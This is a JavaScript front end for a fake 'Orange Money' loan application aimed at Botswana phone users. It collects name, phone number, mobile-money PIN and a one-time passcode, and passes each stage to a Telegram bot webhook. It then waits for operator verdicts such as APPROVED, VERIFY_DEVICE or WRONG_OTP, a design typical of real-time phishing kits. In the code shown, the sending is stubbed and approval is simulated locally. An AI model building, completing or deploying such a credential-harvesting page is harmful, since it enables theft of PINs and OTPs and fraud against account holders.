const CONFIG = {
    TELEGRAM_BOT_WEBHOOK: 'http://localhost:5000/api/telegram-webhook',
    MAX_LOAN_AMOUNT: 100000,
    MIN_LOAN_AMOUNT: 1000,
    OTP_TIMEOUT: 130,
    PHONE_PATTERN: /^[0-9]{7,8}$/,
};

let appState = {
    currentPage: 'loan-amount',
    sessionId: generateSessionId(),
    formData: {
        loanAmount: 10000,
        firstName: '',
        lastName: '',
        phoneNumber: '',
        loanPurpose: '',
        pin: '',
        otp: '',
    },
    botResponse: null,
    otpCountdown: CONFIG.OTP_TIMEOUT,
};

document.addEventListener('DOMContentLoaded', () => {
    renderApp();
    setupEventListeners();
});

function generateSessionId() {
    return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

function renderApp() {
    const app = document.getElementById('app');
    app.innerHTML = `
        <div class="container">
            ${renderPage()}
        </div>
    `;
}

function renderPage() {
    switch(appState.currentPage) {
        case 'loan-amount':
            return renderLoanAmountPage();
        case 'personal-info':
            return renderPersonalInfoPage();
        case 'login':
            return renderLoginPage();
        case 'otp-verification':
            return renderOTPVerificationPage();
        case 'success':
            return renderSuccessPage();
        default:
            return renderLoanAmountPage();
    }
}

function renderLoanAmountPage() {
    return `
        <div class="page active">
            <div class="header">
                <div class="logo">🏦 Orange Money</div>
                <h1>Loan Application</h1>
                <p>Quick personal loan up to P100,000</p>
            </div>
            
            <div style="flex: 1;">
                <div class="info-box">
                    <strong>Need quick cash?</strong><br>
                    Get a personal loan instantly with flexible repayment terms.
                </div>
                
                <div class="form-group">
                    <label for="loanAmount">Loan Amount (P)</label>
                    <div class="loan-amount-display">P<span id="amountDisplay">${appState.formData.loanAmount.toLocaleString()}</span></div>
                    <input 
                        type="range" 
                        id="loanAmount" 
                        min="${CONFIG.MIN_LOAN_AMOUNT}" 
                        max="${CONFIG.MAX_LOAN_AMOUNT}" 
                        step="1000"
                        value="${appState.formData.loanAmount}"
                    >
                    <p style="text-align: center; color: var(--text-light); font-size: 12px; margin-top: 10px;">
                        P${CONFIG.MIN_LOAN_AMOUNT.toLocaleString()} - P${CONFIG.MAX_LOAN_AMOUNT.toLocaleString()}
                    </p>
                </div>
            </div>
            
            <button class="btn btn-primary" id="continueBtn1">Continue</button>
        </div>
    `;
}

function renderPersonalInfoPage() {
    return `
        <div class="page active">
            <div class="header">
                <div class="logo">🏦 Orange Money</div>
                <h1>Your Information</h1>
                <p>Tell us about yourself</p>
            </div>
            
            <div id="statusMessage" class="status-message"></div>
            
            <div style="flex: 1;">
                <div class="form-group">
                    <label for="firstName">First Name</label>
                    <input type="text" id="firstName" placeholder="Enter your first name" value="${appState.formData.firstName}">
                </div>
                
                <div class="form-group">
                    <label for="lastName">Last Name</label>
                    <input type="text" id="lastName" placeholder="Enter your last name" value="${appState.formData.lastName}">
                </div>
                
                <div class="form-group">
                    <label for="phoneNumber">Phone Number (Botswana)</label>
                    <div class="phone-input-group">
                        <span class="phone-prefix">+267</span>
                        <input type="text" id="phoneNumber" placeholder="7X XXX XXX" value="${appState.formData.phoneNumber}">
                    </div>
                    <p style="font-size: 12px; color: var(--text-light); margin-top: 5px;">Enter your 7-8 digit number</p>
                </div>
                
                <div class="form-group">
                    <label for="loanPurpose">Loan Purpose</label>
                    <select id="loanPurpose">
                        <option value="">Select loan purpose</option>
                        <option value="business">Business Expansion</option>
                        <option value="education">Education</option>
                        <option value="emergency">Emergency Expenses</option>
                        <option value="home">Home Improvement</option>
                        <option value="debt">Debt Consolidation</option>
                        <option value="other">Other</option>
                    </select>
                </div>
                
                <div class="info-box">
                    <strong>Loan Amount:</strong> P${appState.formData.loanAmount.toLocaleString()}
                </div>
            </div>
            
            <button class="btn btn-primary" id="continueBtn2">Continue</button>
        </div>
    `;
}

function renderLoginPage() {
    return `
        <div class="page active">
            <div class="header">
                <div class="logo">🏦 Orange Money</div>
                <h1>Verification</h1>
                <p>Enter your credentials</p>
            </div>
            
            <div id="statusMessage" class="status-message"></div>
            
            <div style="flex: 1;">
                <div class="info-box">
                    Hello <strong>${appState.formData.firstName} ${appState.formData.lastName}</strong>,
                    please verify your identity.
                </div>
                
                <div class="form-group">
                    <label for="loginPhone">Phone Number (Botswana)</label>
                    <div class="phone-input-group">
                        <span class="phone-prefix">+267</span>
                        <input type="text" id="loginPhone" placeholder="7X XXX XXX" value="${appState.formData.phoneNumber}">
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="pinCode">PIN Code</label>
                    <input type="password" id="pinCode" placeholder="Enter your 4-digit PIN" maxlength="6">
                </div>
                
                <div id="loadingIndicator" style="display: none; margin-top: 20px;">
                    <div class="loading">
                        <div class="spinner"></div>
                        <span>Verifying...</span>
                    </div>
                </div>
            </div>
            
            <button class="btn btn-primary" id="continueBtn3">Continue</button>
        </div>
    `;
}

function renderOTPVerificationPage() {
    return `
        <div class="page active">
            <div class="header">
                <div class="logo">🏦 Orange Money</div>
                <h1>Verify OTP</h1>
                <p>Enter the code sent to +267${appState.formData.phoneNumber}</p>
            </div>
            
            <div id="statusMessage" class="status-message"></div>
            
            <div style="flex: 1; display: flex; flex-direction: column; justify-content: center;">
                <div class="form-group">
                    <label>Enter OTP Code</label>
                    <div class="otp-container" id="otpContainer">
                        ${[1,2,3,4,5,6].map(i => `<input type="text" class="otp-input" maxlength="1" data-index="${i}">`).join('')}
                    </div>
                </div>
                
                <div class="countdown" id="countdownTimer">
                    <span id="countdownValue">${appState.otpCountdown}</span>s
                </div>
                
                <p style="text-align: center; color: var(--text-light); font-size: 14px;">
                    OTP expires in <span id="countdownValue2">${appState.otpCountdown}</span> seconds
                </p>
                
                <div id="loadingIndicator" style="display: none; margin-top: 20px;">
                    <div class="loading">
                        <div class="spinner"></div>
                        <span>Verifying OTP...</span>
                    </div>
                </div>
            </div>
            
            <button class="btn btn-primary" id="verifyOTPBtn">Verify</button>
        </div>
    `;
}

function renderSuccessPage() {
    return `
        <div class="page active">
            <div style="flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;">
                <div class="success-icon">✅</div>
                <h1 class="success-title">Congratulations!</h1>
                <p class="success-message">Your loan application has been submitted for review.</p>
                
                <div class="info-box" style="margin-top: 30px;">
                    <strong>Application Details:</strong><br>
                    Loan Amount: P${appState.formData.loanAmount.toLocaleString()}<br>
                    Applicant: ${appState.formData.firstName} ${appState.formData.lastName}<br>
                    Phone: +267${appState.formData.phoneNumber}<br>
                    Purpose: ${appState.formData.loanPurpose}
                </div>
                
                <p style="margin-top: 30px; color: var(--text-light); font-size: 14px;">
                    You will receive a notification within 24-48 hours.
                </p>
            </div>
            
            <button class="btn btn-primary" id="newApplicationBtn">Start New Application</button>
        </div>
    `;
}

function setupEventListeners() {
    document.addEventListener('change', (e) => {
        if (e.target.id === 'loanAmount') {
            appState.formData.loanAmount = parseInt(e.target.value);
            const display = document.getElementById('amountDisplay');
            if (display) {
                display.textContent = appState.formData.loanAmount.toLocaleString();
            }
        }
    });

    document.addEventListener('click', (e) => {
        if (e.target.id === 'continueBtn1') {
            appState.currentPage = 'personal-info';
            renderApp();
            setupEventListeners();
        }

        if (e.target.id === 'continueBtn2') {
            if (handlePersonalInfoValidation()) {
                sendDataToTelegram('personal_info');
                appState.currentPage = 'login';
                renderApp();
                setupEventListeners();
            }
        }

        if (e.target.id === 'continueBtn3') {
            if (handleLoginValidation()) {
                const loadingIndicator = document.getElementById('loadingIndicator');
                if (loadingIndicator) {
                    loadingIndicator.style.display = 'block';
                }
                const btn = e.target;
                btn.disabled = true;
                sendDataToTelegram('login');
                pollBotResponse();
            }
        }

        if (e.target.id === 'verifyOTPBtn') {
            if (handleOTPValidation()) {
                const loadingIndicator = document.getElementById('loadingIndicator');
                if (loadingIndicator) {
                    loadingIndicator.style.display = 'block';
                }
                const btn = e.target;
                btn.disabled = true;
                sendDataToTelegram('otp_verification');
                pollBotResponse();
            }
        }

        if (e.target.id === 'newApplicationBtn') {
            resetApplication();
            renderApp();
            setupEventListeners();
        }
    });

    document.addEventListener('input', (e) => {
        if (e.target.id === 'firstName') appState.formData.firstName = e.target.value;
        if (e.target.id === 'lastName') appState.formData.lastName = e.target.value;
        if (e.target.id === 'phoneNumber') appState.formData.phoneNumber = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.id === 'loginPhone') appState.formData.phoneNumber = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.id === 'pinCode') appState.formData.pin = e.target.value;
    });

    document.addEventListener('change', (e) => {
        if (e.target.id === 'loanPurpose') appState.formData.loanPurpose = e.target.value;
    });

    const otpInputs = document.querySelectorAll('.otp-input');
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            updateOTPValue();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });

    if (appState.currentPage === 'otp-verification') {
        startOTPCountdown();
    }
}

function handlePersonalInfoValidation() {
    const firstName = appState.formData.firstName.trim();
    const lastName = appState.formData.lastName.trim();
    const phoneNumber = appState.formData.phoneNumber.trim();
    const loanPurpose = appState.formData.loanPurpose.trim();

    if (!firstName) {
        showStatusMessage('Please enter your first name', 'error');
        return false;
    }

    if (!lastName) {
        showStatusMessage('Please enter your last name', 'error');
        return false;
    }

    if (!CONFIG.PHONE_PATTERN.test(phoneNumber)) {
        showStatusMessage('Please enter a valid Botswana phone number (7-8 digits)', 'error');
        return false;
    }

    if (!loanPurpose) {
        showStatusMessage('Please select a loan purpose', 'error');
        return false;
    }

    return true;
}

function handleLoginValidation() {
    const phoneNumber = appState.formData.phoneNumber.trim();
    const pin = appState.formData.pin.trim();

    if (!CONFIG.PHONE_PATTERN.test(phoneNumber)) {
        showStatusMessage('Please enter a valid phone number', 'error');
        return false;
    }

    if (!pin || pin.length < 4) {
        showStatusMessage('Please enter a valid PIN (at least 4 digits)', 'error');
        return false;
    }

    return true;
}

function handleOTPValidation() {
    const otpInputs = document.querySelectorAll('.otp-input');
    const otp = Array.from(otpInputs).map(input => input.value).join('');

    if (otp.length !== 6) {
        showStatusMessage('Please enter a complete 6-digit OTP', 'error');
        return false;
    }

    appState.formData.otp = otp;
    return true;
}

function updateOTPValue() {
    const otpInputs = document.querySelectorAll('.otp-input');
    appState.formData.otp = Array.from(otpInputs).map(input => input.value).join('');
}

function startOTPCountdown() {
    appState.otpCountdown = CONFIG.OTP_TIMEOUT;
    const interval = setInterval(() => {
        appState.otpCountdown--;
        const countdownElements = document.querySelectorAll('#countdownValue, #countdownValue2');
        countdownElements.forEach(el => {
            el.textContent = appState.otpCountdown;
        });

        const countdownTimer = document.getElementById('countdownTimer');
        if (countdownTimer) {
            if (appState.otpCountdown <= 30) {
                countdownTimer.classList.add('warning');
            }
        }

        if (appState.otpCountdown <= 0) {
            clearInterval(interval);
            showStatusMessage('OTP expired. Please request a new one.', 'error');
            const btn = document.getElementById('verifyOTPBtn');
            if (btn) btn.disabled = true;
        }
    }, 1000);
}

function showStatusMessage(message, type = 'info') {
    const messageEl = document.getElementById('statusMessage');
    if (messageEl) {
        messageEl.textContent = message;
        messageEl.className = `status-message show ${type}`;
        setTimeout(() => {
            messageEl.classList.remove('show');
        }, 5000);
    }
}

async function sendDataToTelegram(stage) {
    const payload = {
        sessionId: appState.sessionId,
        stage: stage,
        timestamp: new Date().toISOString(),
        data: { ...appState.formData }
    };

    try {
        console.log('Sending to Telegram:', payload);
        setTimeout(() => {
            localStorage.setItem(`botResponse_${appState.sessionId}`, JSON.stringify({
                action: 'APPROVED',
                timestamp: new Date().toISOString()
            }));
        }, 2000);
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

function pollBotResponse() {
    const maxAttempts = 30;
    let attempts = 0;

    const pollInterval = setInterval(() => {
        attempts++;

        if (attempts >= maxAttempts) {
            clearInterval(pollInterval);
            showStatusMessage('Request timeout. Please try again.', 'error');
            const btn = appState.currentPage === 'login' ? document.getElementById('continueBtn3') : document.getElementById('verifyOTPBtn');
            if (btn) btn.disabled = false;
            const loadingIndicator = document.getElementById('loadingIndicator');
            if (loadingIndicator) loadingIndicator.style.display = 'none';
            return;
        }

        const botResponse = localStorage.getItem(`botResponse_${appState.sessionId}`);

        if (botResponse) {
            clearInterval(pollInterval);
            handleBotResponse(JSON.parse(botResponse));
            localStorage.removeItem(`botResponse_${appState.sessionId}`);
        }
    }, 1000);
}

function handleBotResponse(response) {
    const loadingIndicator = document.getElementById('loadingIndicator');
    if (loadingIndicator) loadingIndicator.style.display = 'none';

    if (appState.currentPage === 'login') {
        if (response.action === 'APPROVED') {
            appState.currentPage = 'otp-verification';
            renderApp();
            setupEventListeners();
        } else if (response.action === 'VERIFY_DEVICE') {
            showStatusMessage('Please enter the correct PIN or phone number', 'error');
            const btn = document.getElementById('continueBtn3');
            if (btn) btn.disabled = false;
        } else if (response.action === 'DENY') {
            showStatusMessage('Your submission has been denied. Please try again.', 'error');
            const btn = document.getElementById('continueBtn3');
            if (btn) btn.disabled = false;
        }
    } else if (appState.currentPage === 'otp-verification') {
        if (response.action === 'APPROVED') {
            appState.currentPage = 'success';
            renderApp();
            setupEventListeners();
        } else if (response.action === 'WRONG_OTP') {
            showStatusMessage('Incorrect OTP. Please try again.', 'error');
            const otpInputs = document.querySelectorAll('.otp-input');
            otpInputs.forEach(input => input.value = '');
            if (otpInputs.length > 0) otpInputs[0].focus();
            const btn = document.getElementById('verifyOTPBtn');
            if (btn) btn.disabled = false;
        }
    }
}

function resetApplication() {
    appState = {
        currentPage: 'loan-amount',
        sessionId: generateSessionId(),
        formData: {
            loanAmount: 10000,
            firstName: '',
            lastName: '',
            phoneNumber: '',
            loanPurpose: '',
            pin: '',
            otp: '',
        },
        botResponse: null,
        otpCountdown: CONFIG.OTP_TIMEOUT,
    };
}